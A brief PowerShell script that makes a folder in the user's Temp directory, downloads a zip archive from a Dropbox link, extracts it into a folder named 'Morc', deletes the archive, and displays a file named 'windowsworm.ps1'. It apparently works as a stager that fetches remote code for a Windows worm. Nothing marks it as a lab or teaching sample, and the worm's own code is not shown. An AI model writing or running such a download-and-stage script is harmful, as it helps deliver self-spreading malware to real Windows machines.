if ( !(Test-Path .\localips.txt) ){
    mkdir "C:\Users\$env:UserName\AppData\Local\Temp\Chara"
}	
cd "C:\Users\$env:UserName\AppData\Local\Temp\Chara"
Invoke-WebRequest -Uri https://www.dropbox.com/sh/wyre3girbzm49vw/AAAxObXg2cE-BVN_ckpGYiICa?dl=1 -O temp.zip; Get-Item temp.zip | Expand-Archive -DestinationPath "Morc"; Remove-Item temp.zip
cd "Morc"
cat windowsworm.ps1